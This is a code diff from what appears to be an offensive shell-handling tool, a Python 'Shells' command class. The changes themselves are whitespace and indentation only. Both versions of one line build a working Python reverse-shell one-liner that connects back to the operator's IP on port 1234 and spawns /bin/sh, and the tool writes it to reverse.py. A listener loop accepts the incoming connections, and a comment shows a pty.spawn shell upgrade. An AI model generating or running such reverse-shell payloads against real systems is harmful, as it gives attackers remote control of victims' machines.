@@ -55,8 +55,8 @@ class Shells(Cmd):
         userIP = socket.gethostbyname(socket.gethostname())
 
         #this is the reverse script that gets written int othe file
-        output = """python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\""""+ userIP + """\",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'"""
-        
+        output = """python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"""" + userIP + """\",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'"""
+
         file = open("reverse.py", "w+")
         file.write(output)
         file.close()
@@ -75,14 +75,13 @@ class Shells(Cmd):
         while True:
             print("Waiting for connection")
             connection, client_address = listener.accept()
-                # python -c 'import pty;
-                # pty.spawn("/bin/bash")'
+            # python -c 'import pty;
+            # pty.spawn("/bin/bash")'
             try:
                 print("from" + client_address)
 
             finally:
                 connection.close()
-
 
     # def do_exit(self, line):
     #     "Exits back to main menu"
